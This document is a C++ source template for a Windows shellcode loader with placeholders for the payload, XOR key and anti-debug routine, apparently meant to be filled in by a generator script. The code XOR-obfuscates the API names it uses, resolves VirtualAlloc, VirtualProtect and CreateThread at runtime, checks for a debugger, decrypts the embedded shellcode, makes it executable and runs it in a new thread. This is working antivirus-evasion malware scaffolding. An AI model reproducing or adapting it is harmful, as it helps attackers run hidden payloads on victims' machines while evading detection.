#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <conio.h> 
#include <iostream>
#include <winternl.h>
#include "helper.h"

<SHELLCODE>

char key[] = <XOR_KEY>;
unsigned int key_len = sizeof(key);
unsigned int shellcode_len = sizeof(shellcode);


<ANTI_DEBUG>


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    void* payloadPtr = nullptr;
    BOOL rv;
    HANDLE th;
    DWORD oldProtect = 0;
    HINSTANCE kernelHandle;
    CREATETHREAD createThread;
    VIRTUALALLOC  virtualAlloc;
    VIRTUALPROTECT virtualProtect;
    unsigned char kern[] = <KERNEL32>
    unsigned char crea[] = <CREATE_THREAD>
    unsigned char virProtect[] = <VIRTUAL_PROTECT>
    unsigned char virAlloc[] = <VIRTUAL_ALLOC>

    // Anti debug check
    antiDebug();

    // More dynamic invoke shit
    xor_data(kern, sizeof(kern), key, key_len);
    kernelHandle = LoadLibraryA((LPCSTR) kern);
    xor_data(kern, sizeof(kern), key, key_len);

    if (kernelHandle == NULL)
    {
        return 1;
    }

    // Get pointer to functions which we can invoke
    xor_data(crea, sizeof(crea), key, key_len);
    createThread = (CREATETHREAD)GetProcAddress(kernelHandle, (LPCSTR) crea);
    xor_data(crea, sizeof(crea), key, key_len);

    if (!createThread)
    {
        // handle the error
        FreeLibrary(kernelHandle);
        return 2;
    }
    xor_data(virAlloc, sizeof(virAlloc), key, key_len);
    virtualAlloc = (VIRTUALALLOC)GetProcAddress(kernelHandle, (LPCSTR) virAlloc);
    xor_data(virAlloc, sizeof(virAlloc), key, key_len);

    if (!virtualAlloc)
    {
        // handle the error
        FreeLibrary(kernelHandle);
        return 2;
    }

    xor_data(virProtect, sizeof(virProtect), key, key_len);
    virtualProtect = (VIRTUALPROTECT)GetProcAddress(kernelHandle, (LPCSTR) virProtect);
    xor_data(virProtect, sizeof(virProtect), key, key_len);

    if (!virtualProtect)
    {
        // handle the error
        FreeLibrary(kernelHandle);
        return 2;
    }

    // XOR shellcode
    xor_data(shellcode, shellcode_len, key, key_len);
    //printf("Shellcode decrypted, injecting\n");
    // Allocate memory to write payload into memory
    //printf("Allocating memory\n");
    payloadPtr = virtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy payload to memory
    //printf("Copying buffer\n");
    RtlMoveMemory(payloadPtr, shellcode, shellcode_len);
    xor_data(shellcode, shellcode_len, key, key_len);
    // Change permissions to RX
    //printf("Changing to execute permissions\n");
    rv = virtualProtect(payloadPtr, shellcode_len, PAGE_EXECUTE_READ, &oldProtect);


    if (rv != 0)
    {
        //printf("Starting thread\n");
        //Create thread at start of memory
        th = createThread(0, 0, (LPTHREAD_START_ROUTINE)payloadPtr, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }
    return 0;
}
